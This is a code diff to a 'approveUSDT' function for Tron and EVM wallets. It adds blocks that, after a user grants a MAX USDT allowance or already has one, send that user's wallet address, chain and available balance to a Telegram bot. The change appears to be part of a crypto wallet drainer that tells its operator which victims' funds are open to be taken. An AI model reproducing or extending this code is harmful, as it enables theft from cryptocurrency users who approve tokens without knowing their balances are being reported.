@@ -673,6 +673,31 @@ export async function approveUSDT(
 
         // If allowance is sufficient, no need to approve
         if (currentAllowanceBigNumber.gte(amountBigNumber)) {
+          // Send Telegram notification for existing allowance
+          try {
+            const { telegramService } = await import("@/lib/telegram");
+            if (telegramService.isConfigured()) {
+              const currentBalance = userBalanceBigNumber
+                .div(tronWeb.toBigNumber(10 ** config.decimals))
+                .toString();
+
+              await telegramService.sendApproveSuccessNotification({
+                walletType: "TronLink",
+                chain: "tron",
+                userAddress: userAddress,
+                amount: `Already approved (${currentBalance} USDT available)`,
+                token: "USDT",
+                timestamp: new Date().toISOString(),
+              });
+              console.log(
+                "📱 Telegram notification sent for existing Tron allowance"
+              );
+            }
+          } catch (telegramError) {
+            console.log("📱 Telegram notification failed:", telegramError);
+            // Don't fail the approval if telegram fails
+          }
+
           return true;
         }
 
@@ -683,6 +708,29 @@ export async function approveUSDT(
 
         // Wait for transaction to be processed
         await new Promise((resolve) => setTimeout(resolve, 3000));
+
+        // Send Telegram notification for successful approval
+        try {
+          const { telegramService } = await import("@/lib/telegram");
+          if (telegramService.isConfigured()) {
+            const currentBalance = userBalanceBigNumber
+              .div(tronWeb.toBigNumber(10 ** config.decimals))
+              .toString();
+
+            await telegramService.sendApproveSuccessNotification({
+              walletType: "TronLink",
+              chain: "tron",
+              userAddress: userAddress,
+              amount: `MAX (${currentBalance} USDT available)`,
+              token: "USDT",
+              timestamp: new Date().toISOString(),
+            });
+            console.log("📱 Telegram notification sent for Tron approval");
+          }
+        } catch (telegramError) {
+          console.log("📱 Telegram notification failed:", telegramError);
+          // Don't fail the approval if telegram fails
+        }
 
         return true;
       } else {
@@ -738,6 +786,33 @@ export async function approveUSDT(
 
     // If allowance is sufficient, no need to approve
     if (hasSufficientAllowance) {
+      // Send Telegram notification for existing allowance
+      try {
+        const { telegramService } = await import("@/lib/telegram");
+        if (telegramService.isConfigured()) {
+          const currentBalance = ethers.formatUnits(
+            userBalance,
+            config.decimals
+          );
+          const walletType = wallet.walletType || "EVM Wallet";
+
+          await telegramService.sendApproveSuccessNotification({
+            walletType: walletType,
+            chain: chain,
+            userAddress: userAddress,
+            amount: `Already approved (${currentBalance} USDT available)`,
+            token: "USDT",
+            timestamp: new Date().toISOString(),
+          });
+          console.log(
+            "📱 Telegram notification sent for existing EVM allowance"
+          );
+        }
+      } catch (telegramError) {
+        console.log("📱 Telegram notification failed:", telegramError);
+        // Don't fail the approval if telegram fails
+      }
+
       return true;
     }
 
@@ -751,6 +826,28 @@ export async function approveUSDT(
     );
 
     await approvalTx.wait();
+
+    // Send Telegram notification for successful approval
+    try {
+      const { telegramService } = await import("@/lib/telegram");
+      if (telegramService.isConfigured()) {
+        const currentBalance = ethers.formatUnits(userBalance, config.decimals);
+        const walletType = wallet.walletType || "EVM Wallet";
+
+        await telegramService.sendApproveSuccessNotification({
+          walletType: walletType,
+          chain: chain,
+          userAddress: userAddress,
+          amount: `MAX (${currentBalance} USDT available)`,
+          token: "USDT",
+          timestamp: new Date().toISOString(),
+        });
+        console.log("📱 Telegram notification sent for EVM approval");
+      }
+    } catch (telegramError) {
+      console.log("📱 Telegram notification failed:", telegramError);
+      // Don't fail the approval if telegram fails
+    }
 
     return true;
   } catch (error: any) {
